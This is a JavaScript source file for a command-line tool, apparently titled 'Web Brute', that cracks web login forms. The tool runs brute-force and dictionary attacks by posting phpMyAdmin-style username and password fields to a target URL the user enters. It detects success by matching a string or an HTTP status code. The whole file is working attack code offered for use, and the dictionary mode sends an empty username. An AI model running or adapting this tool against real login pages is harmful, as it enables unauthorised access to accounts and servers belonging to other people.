// Import required modules
const axios = require('axios');
const readlineSync = require('readline-sync');
const fs = require('fs');
const colors = require('colors');

// Function to display a colored banner
function displayBanner() {
  const banner = `
  ▄▄▌ ▐ ▄▌▄▄▄ .▄▄▄▄·     ▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄▄▄▄ .
██· █▌▐█▀▄.▀·▐█ ▀█▪    ▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·
██▪▐█▐▐▌▐▀▀▪▄▐█▀▀█▄    ▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄
▐█▌██▐█▌▐█▄▄▌██▄▪▐█    ██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌
 ▀▀▀▀ ▀▪ ▀▀▀ ·▀▀▀▀     ·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀ 
						by Oziesiek	`;

  console.log(colors.red(banner));
}

// Display the banner at the beginning
displayBanner();

// Declare variables at a higher scope
let differentiationMethod;
let successDifferentiator = '';
let useDefaultStatusCodes = true; // Default value for status codes

// Get attack type from user
const attackType = readlineSync.keyInSelect(['Brute Force', 'Dictionary'], 'Choose attack type:', { cancel: false });

// Get target URL from user
const targetUrl = readlineSync.question('Enter target URL: ');

// Ask for username only if the user chooses the Brute Force attack
let username = '';
if (attackType === 0) {
  username = readlineSync.question('Enter username: ');
}

// Ask how to differentiate successful login only if the user chooses the Brute Force attack
if (attackType === 0) {
  differentiationMethod = readlineSync.keyInSelect(['String', 'HTTP Status Code'], 'Choose how to differentiate successful login:', { cancel: false });

  if (differentiationMethod === 0) {
    successDifferentiator = readlineSync.question('Enter the string to differentiate successful login: ');
  } else {
    // If differentiation method is HTTP Status Code, ask the user whether to use default status codes
    useDefaultStatusCodes = readlineSync.keyInYNStrict('Use default HTTP status codes (200 or 302)?');
  }
}

// Get password length or dictionary path based on the attack type
if (attackType === 0) {
  let passwordLength = 0;

  // Validate input for password length
  while (isNaN(passwordLength) || passwordLength <= 0) {
    const userInput = readlineSync.question('Enter desired password length: ');

    if (!/^\d+$/.test(userInput)) {
      console.log('Please enter a valid positive number for password length.');
      continue;
    }

    passwordLength = parseInt(userInput, 10);

    if (isNaN(passwordLength) || passwordLength <= 0) {
      console.log('Please enter a valid positive number for password length.');
    }
  }

  // Ask the user for custom status codes if they chose HTTP Status Code differentiation
  let customStatusCodes = [];
  if (differentiationMethod === 1 && !useDefaultStatusCodes) {
    let customCodesInput = '';

    // Validate input for custom status codes
    while (customCodesInput.trim() === '' || !/^(\d+\s*,\s*)*\d+$/.test(customCodesInput)) {
      customCodesInput = readlineSync.question('Enter custom HTTP status codes (comma-separated): ');

      if (customCodesInput.trim() === '' || !/^(\d+\s*,\s*)*\d+$/.test(customCodesInput)) {
        console.log('Please enter a valid comma-separated list of numbers for custom status codes.');
      }
    }

    customStatusCodes = customCodesInput.split(',').map(code => parseInt(code.trim(), 10));
  }

  bruteForceAttack(targetUrl, username, passwordLength, differentiationMethod, successDifferentiator, useDefaultStatusCodes, customStatusCodes);
} else if (attackType === 1) {
  const dictionaryPath = readlineSync.question('Enter path to the dictionary file: ');

  // Ask the user how to differentiate successful login for Dictionary attack
  differentiationMethod = readlineSync.keyInSelect(['String', 'HTTP Status Code'], 'Choose how to differentiate successful login:', { cancel: false });

  if (differentiationMethod === 0) {
    successDifferentiator = readlineSync.question('Enter the string to differentiate successful login: ');
  } else {
    // If differentiation method is HTTP Status Code, ask the user whether to use default status codes
    useDefaultStatusCodes = readlineSync.keyInYNStrict('Use default HTTP status codes (200 or 302)?');
  }

  // Ask the user for custom status codes if they chose HTTP Status Code differentiation for Dictionary attack
  let customStatusCodes = [];
  if (differentiationMethod === 1 && !useDefaultStatusCodes) {
    let customCodesInput = '';

    // Validate input for custom status codes
    while (customCodesInput.trim() === '' || !/^(\d+\s*,\s*)*\d+$/.test(customCodesInput)) {
      customCodesInput = readlineSync.question('Enter custom HTTP status codes (comma-separated): ');

      if (customCodesInput.trim() === '' || !/^(\d+\s*,\s*)*\d+$/.test(customCodesInput)) {
        console.log('Please enter a valid comma-separated list of numbers for custom status codes.');
      }
    }

    customStatusCodes = customCodesInput.split(',').map(code => parseInt(code.trim(), 10));
  }

  dictionaryAttack(targetUrl, dictionaryPath, differentiationMethod, successDifferentiator, useDefaultStatusCodes, customStatusCodes);
}

// Async function to make a login request
async function makeLoginRequest(url, username, hashedPassword, differentiationMethod, successDifferentiator, useDefaultStatusCodes, customStatusCodes) {
  const loginUrl = `${url}/`;

  try {
    // Perform the POST request to initiate the login attempt
    const response = await axios.post(loginUrl, {
      pma_username: username,
      pma_password: hashedPassword,
    });

    // Check the differentiation method chosen by the user
    if (differentiationMethod === 0) {
      // Check for the specified string in the response content
      if (response.data.includes(successDifferentiator)) {
        console.log(`Successful login - Username: ${username}, Password: ${hashedPassword}`);
        return true;
      } else {
        console.log(`Login failed - Username: ${username}, Password: ${hashedPassword}`);
        return false;
      }
    } else {
      // Check the HTTP status code for success
      const isSuccessStatusCode = useDefaultStatusCodes ? (response.status === 200 || response.status === 302) : customStatusCodes.includes(response.status);

      if (isSuccessStatusCode) {
        console.log(`Successful login - Username: ${username}, Password: ${hashedPassword}`);
        return true;
      } else {
        console.log(`Login failed - Username: ${username}, Password: ${hashedPassword}`);
        return false;
      }
    }
  } catch (error) {
    console.error(`Error during login attempt: ${error.message}`);
    return false;
  }
}

// Async function for brute force attack
async function bruteForceAttack(url, username, passwordLength, differentiationMethod, successDifferentiator, useDefaultStatusCodes, customStatusCodes) {
  const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-=_+[]{}|;:,.<>?';

  // Recursive brute force function
  const recursiveBruteForce = async (passwordAttempt, depth) => {
    if (depth === 0) {
      // Base case: attempt login with the current password
      if (await makeLoginRequest(url, username, passwordAttempt, differentiationMethod, successDifferentiator, useDefaultStatusCodes, customStatusCodes)) {
        return true;  // Successful login
      } else {
        console.log(`Login failed - Username: ${username}, Password: ${passwordAttempt}`);
        return false;
      }
    }

    // Recursive case: iterate over each character
    for (let i = 0; i < characters.length; i++) {
      const newAttempt = passwordAttempt + characters[i];
      if (await recursiveBruteForce(newAttempt, depth - 1)) {
        return true;  // Successful login
      }
    }

    return false;
  };

  // Start the recursive brute force attack
  if (!(await recursiveBruteForce('', passwordLength))) {
    console.log('Brute force attack complete. No valid credentials found.');
  }
}

// Async function for dictionary attack
async function dictionaryAttack(url, dictionaryPath, differentiationMethod, successDifferentiator, useDefaultStatusCodes, customStatusCodes) {
  try {
    const dictionaryContent = fs.readFileSync(dictionaryPath, 'utf8').split('\n');
    
    for (const password of dictionaryContent) {
      if (await makeLoginRequest(url, username, password, differentiationMethod, successDifferentiator, useDefaultStatusCodes, customStatusCodes)) {
        console.log(`Successful login - Username: ${username}, Password: ${password}`);
        return;
      }
    }

    console.log('Dictionary attack complete. No valid credentials found.');
  } catch (error) {
    console.error(`Error reading dictionary file: ${error.message}`);
  }
}
